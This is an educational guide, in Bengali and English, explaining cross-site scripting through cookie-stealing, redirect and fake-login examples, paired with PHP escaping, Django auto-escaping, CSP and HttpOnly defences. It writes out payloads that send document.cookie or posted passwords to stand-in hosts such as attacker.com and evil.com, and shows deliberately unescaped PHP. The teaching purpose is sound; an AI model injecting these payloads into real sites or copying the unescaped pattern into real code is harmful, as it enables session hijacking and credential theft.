# XSS Real Attacks - Complete Breakdown

Understanding how XSS attacks work in simple language.

---

## 📋 Table of Contents

1. [What is XSS? (One Line)](#what-is-xss-one-line)
2. [Attack 1: Cookie Stealing](#attack-1-cookie-stealing)
3. [Attack 2: User Redirect](#attack-2-user-redirect)
4. [Attack 3: Fake Login Form](#attack-3-fake-login-form)
5. [Root Cause](#root-cause)
6. [Defense Mechanisms](#defense-mechanisms)
7. [Quick Reference](#quick-reference)

---

## 🔴 What is XSS? (One Line)

> **User-এর দেওয়া input যদি escape না করে HTML হিসেবে চালানো হয়, তাহলে attacker নিজের JavaScript চালাতে পারে।**

---

## 1️⃣ Attack 1: Cookie Stealing

### 🔥 Attack Code

```html
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

### 🧠 সহজ ভাষায় কী হচ্ছে?

**Step 1:** তোমার ওয়েবসাইটে user input হিসেবে এই script ঢুকলো

**Step 2:** তুমি escape না করে print করেছো:
```php
<h2>Welcome <?= $username ?></h2>
```

**Step 3:** Browser এটাকে JavaScript হিসেবে চালালো

### 🧠 এই Script কী করছে?

#### Part 1: Cookie Read
```javascript
document.cookie
```
➡️ Browser-এ থাকা login session cookie নেয়

#### Part 2: Send to Attacker
```javascript
document.location = "http://attacker.com/steal.php?cookie=..."
```
➡️ User-কে attacker-এর server-এ পাঠায়  
➡️ Cookie URL-এর সাথে পাঠিয়ে দেয়

### 😱 ফলাফল কী?

- ✅ Attacker তোমার cookie পেয়ে গেল
- ✅ সেই cookie দিয়ে user হিসেবে login করতে পারবে
- ✅ একে বলে **Session Hijacking**

### 🛡️ Django কীভাবে বাঁচায়?

1. **Auto escape করে** - Script text হিসেবে দেখায়
2. **HttpOnly cookie দেয়** - JavaScript থেকে cookie পড়তে দেয় না
3. **CSRF token** - Extra protection layer

### Example Flow

**Vulnerable PHP:**
```php
<?php
$username = $_POST['username'];
// username = "<script>document.location='http://evil.com?c='+document.cookie</script>"
?>
<h2>Welcome <?= $username ?></h2>
```

**Output (Dangerous!):**
```html
<h2>Welcome <script>document.location='http://evil.com?c='+document.cookie</script></h2>
```

**Safe PHP:**
```php
<h2>Welcome <?= htmlspecialchars($username, ENT_QUOTES, 'UTF-8') ?></h2>
```

**Output (Safe):**
```html
<h2>Welcome &lt;script&gt;document.location='http://evil.com?c='+document.cookie&lt;/script&gt;</h2>
```

---

## 2️⃣ Attack 2: User Redirect (Phishing / Malware)

### 🔥 Attack Code

```html
<script>
window.location='http://malicious-site.com';
</script>
```

### 🧠 কী হচ্ছে?

**Step 1:** Script execute হচ্ছে

**Step 2:** Browser-কে বলছে:
```
"এই site ছেড়ে অন্য site এ যাও"
```

### 😱 ফলাফল

User হঠাৎ অন্য site-এ চলে যায়:
- 🔴 Fake site যেটা দেখতে আসল site-এর মতো
- 🔴 Malware download site
- 🔴 Phishing page (password চুরি করার জন্য)

### Real Attack Scenarios

#### Scenario 1: Bank Phishing
```javascript
<script>
window.location='http://fake-bank-site.com/login';
</script>
```
➡️ User মনে করে bank site-এ আছে  
➡️ Password দেয়  
➡️ Attacker পায়

#### Scenario 2: Malware Download
```javascript
<script>
window.location='http://malware-site.com/virus.exe';
</script>
```
➡️ Automatic download শুরু  
➡️ User-এর computer infected

#### Scenario 3: Fake Prize
```javascript
<script>
alert('Congratulations! You won $1000! Click OK to claim.');
window.location='http://scam-site.com';
</script>
```
➡️ User excited হয়ে click করে  
➡️ Personal info দেয়  
➡️ Identity theft

### 🛡️ Django / Secure PHP

**Django (Safe):**
```html
<h2>{{ comment }}</h2>
<!-- Even if comment contains redirect script, it shows as text -->
```

**PHP (Safe):**
```php
<h2><?= htmlspecialchars($comment, ENT_QUOTES, 'UTF-8') ?></h2>
```

**Additional Protection:**
- Content Security Policy (CSP) headers
- X-Frame-Options
- Script execution control

---

## 3️⃣ Attack 3: Fake Login Form (সবচেয়ে ভয়ংকর 😨)

### 🔥 Attack Code

```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
    <h1>Session Expired - Please Login Again</h1>
    <form action="http://attacker.com/steal.php" method="post">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
</div>
```

### 🧠 কী হচ্ছে?

**Step 1:** Attacker পুরো screen ঢেকে ফেলছে
```css
position:fixed;      /* Screen-এ fix হয়ে থাকবে */
top:0; left:0;       /* Top-left corner থেকে */
width:100%;          /* পুরো width */
height:100%;         /* পুরো height */
background:white;    /* সাদা background */
z-index:9999;        /* সবার উপরে */
```

**Step 2:** আসল site-এর উপর fake login বসাচ্ছে

**Step 3:** User মনে করছে site আবার login চাইছে

### 😱 User কী করবে?

1. দেখবে: "Session Expired - Please Login Again"
2. মনে করবে: "আচ্ছা, logout হয়ে গেছি"
3. Username ও Password দিবে
4. Submit করবে
5. যাবে: `http://attacker.com/steal.php`

➡️ **Password চুরি হয়ে গেল** 😵

### Visual Representation

**Before Attack:**
```
┌─────────────────────────────────┐
│  Your Website                   │
│  [Real Content]                 │
│  [User Comments]                │
│  [Footer]                       │
└─────────────────────────────────┘
```

**After Attack:**
```
┌─────────────────────────────────┐
│ ╔═══════════════════════════╗   │
│ ║ Session Expired           ║   │
│ ║ Please Login Again        ║   │
│ ║                           ║   │
│ ║ Username: [__________]    ║   │
│ ║ Password: [__________]    ║   │
│ ║         [Login]           ║   │
│ ╚═══════════════════════════╝   │
│  (Original content hidden)      │
└─────────────────────────────────┘
```

### 🛡️ কেন এটা সম্ভব?

- ❌ User input escape করা হয়নি
- ❌ Browser HTML হিসেবে চালিয়েছে
- ❌ CSS injection allowed
- ❌ No Content Security Policy

### Real Code Example

**Vulnerable Site:**
```php
<?php
// User submits comment
$comment = $_POST['comment'];
// No escaping!
?>

<div class="comments">
    <p><?= $comment ?></p>
</div>
```

**If comment is:**
```html
Nice post! <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
<h1>Session Expired</h1>
<form action="http://evil.com/steal" method="post">
Username: <input name="u"><br>
Password: <input name="p" type="password"><br>
<button>Login</button>
</form>
</div>
```

**Browser shows:** Fake login covering everything!

**Safe Version:**
```php
<div class="comments">
    <p><?= htmlspecialchars($comment, ENT_QUOTES, 'UTF-8') ?></p>
</div>
```

**Output:** Attack code shows as text, doesn't execute

---

## 🔑 Root Cause

### মূল সমস্যা কোথায়?

> **Unescaped user input**

যেখানে তুমি লিখেছো:

```php
<?= $user_input ?>
```

ওখানেই বিপদ 😈

### Why This Happens

**Browser doesn't know:**
- ❓ Is this legitimate HTML?
- ❓ Or attacker's code?

**Browser's rule:**
```
"যা দেখি তাই চালাই"
```

### The Vulnerable Pattern

```php
// ANY user input
$input = $_POST['anything'];
$input = $_GET['anything'];
$input = $_COOKIE['anything'];

// Directly displayed
echo $input;           // DANGER!
echo "<h1>$input</h1>"; // DANGER!
?>
<div><?= $input ?></div>  <!-- DANGER! -->
```

---

## ✅ Defense Mechanisms

### 🔐 PHP Proper Defense

```php
<?= htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8') ?>
```

**What it does:**
```
< → &lt;
> → &gt;
" → &quot;
' → &#039;
& → &amp;
```

➡️ Browser বুঝবে: "এইটা text, code না"

### 🔐 Django Proper Defense

```html
{{ user_input }}
```

➡️ Auto escape করে দেয়

### Additional Protection Layers

#### 1. Content Security Policy (CSP)
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```
➡️ Only allows scripts from your domain


| Rule                 | Meaning                          |
| -------------------- | -------------------------------- |
| `default-src 'self'` | শুধু নিজের site থেকে resource    |
| `script-src 'self'`  | inline / injected script চলবে না |
| `object-src 'none'`  | flash, plugin block              |
| `base-uri 'self'`    | base tag attack block            |

---


#### 2. HttpOnly Cookies
```php
setcookie('session', $value, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```
➡️ JavaScript can't read cookies

#### 3. X-Frame-Options
```php
header('X-Frame-Options: DENY');
```
➡️ Prevents clickjacking

#### 4. Input Validation
```php
// Validate before storing
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die('Invalid email');
}

// Still escape on output!
echo htmlspecialchars($email);
```

---

## 🧠 মনে রাখার মতো কথা (Tattoo-worthy)

### ❗ Rule 1
**Browser বোঝে না "ভালো code" আর "খারাপ code"**

Browser just executes what it sees.

### ❗ Rule 2
**Browser যা পায় তাই চালায়**

Good code or bad code - browser doesn't care.

### ❗ Rule 3
**Escape না করলে attacker code চালাবে**

Your responsibility to protect users.

---

## 📝 Quick Reference

### XSS Real Attacks

#### Cookie Steal
- `document.cookie` চুরি
- Session hijack
- Attacker becomes you

#### Redirect
- User অন্য site-এ পাঠানো
- Malware / phishing
- Fake login pages

#### Fake Login
- Screen ঢেকে fake form
- Password steal
- Identity theft

### Root Cause
```
Unescaped user input
```

### Defense

**PHP:**
```php
htmlspecialchars($input, ENT_QUOTES, 'UTF-8')
```

**Django:**
```html
{{ input }}  <!-- Auto escape -->
```

### Remember
```
ESCAPE ON OUTPUT, NOT INPUT
```

---

## 🎯 Comparison Table

| Attack Type | Method | Impact | Django Protected? | PHP Manual? |
|-------------|--------|--------|-------------------|-------------|
| **Cookie Steal** | `document.cookie` | Session hijack | ✅ Yes | ❌ Manual |
| **Redirect** | `window.location` | Phishing | ✅ Yes | ❌ Manual |
| **Fake Login** | CSS overlay | Password steal | ✅ Yes | ❌ Manual |
| **Keylogger** | `document.onkeypress` | Record typing | ✅ Yes | ❌ Manual |
| **Webcam Access** | `navigator.mediaDevices` | Spy on user | ✅ Yes | ❌ Manual |

---

## 💡 Summary

### The Problem
```php
// Vulnerable
<?= $user_input ?>
```

### The Solution
```php
// Safe
<?= htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8') ?>
```

### Django Advantage
```html
<!-- Always safe by default -->
{{ user_input }}
```

### Key Learning
1. ⚠️ XSS = Running attacker's JavaScript
2. 🔐 Defense = Escape output
3. 🎯 Django = Auto-safe
4. 💪 PHP = Manual responsibility

---

## 🚀 Next Level Security

After mastering XSS, learn:

1. **CSRF** - Cross-Site Request Forgery
2. **SQL Injection** - Database attacks
3. **File Upload** - Malicious file prevention
4. **Session Security** - Session hijacking prevention

---

এখন তুমি XSS attack সম্পূর্ণ বুঝে গেছো! 🔐💪

Real attack কীভাবে কাজ করে জানা = ভালো defense করতে পারবে।

Django এটা automatically করে, PHP-তে manually করতে হয়।  
That's the power of frameworks! 🚀

**Updated:** February 2026  
**Type:** XSS Real Attacks Explanation Guide